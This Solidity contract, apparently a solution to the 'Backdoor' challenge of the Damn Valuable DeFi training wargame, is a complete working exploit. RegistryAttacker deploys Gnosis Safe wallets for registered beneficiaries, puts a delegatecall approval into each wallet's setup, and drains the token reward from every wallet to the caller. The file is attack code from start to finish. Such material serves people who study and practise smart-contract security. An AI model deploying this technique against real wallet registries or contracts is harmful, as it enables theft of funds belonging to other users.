// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

contract RegistryAttacker {
    GnosisSafeProxyFactory private proxyFactory;
    IProxyCreationCallback private walletRegistry;
    address masterCopy;
    address[] beneficiaries;

    address payable[5] public wallets;
    DamnValuableToken public dvt;

    constructor(
        address _proxyFactory,
        address _walletRegistry,
        address _masterCopy,
        address _dvt,
        address[] memory _beneficiaries
    ) {
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        masterCopy = _masterCopy;
        beneficiaries = _beneficiaries;
        dvt = DamnValuableToken(_dvt);
    }

    function approveTokenSpending(address _token, address _spender) external {
        DamnValuableToken(_token).approve(address(_spender), 10 ether);
    }

    function attack() external {
        bytes memory maliciousCall = abi.encodeWithSignature(
            "approveTokenSpending(address,address)",
            address(dvt),
            address(this)
        );

        for (uint8 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),
                maliciousCall,
                address(0x0),
                address(0x0),
                0,
                payable(0x0)
            );

            address payable walletAddress = payable(
                proxyFactory.createProxyWithCallback(
                    masterCopy,
                    initializer,
                    1,
                    walletRegistry
                )
            );
            dvt.transferFrom(walletAddress, msg.sender, 10 ether);
        }
    }
}
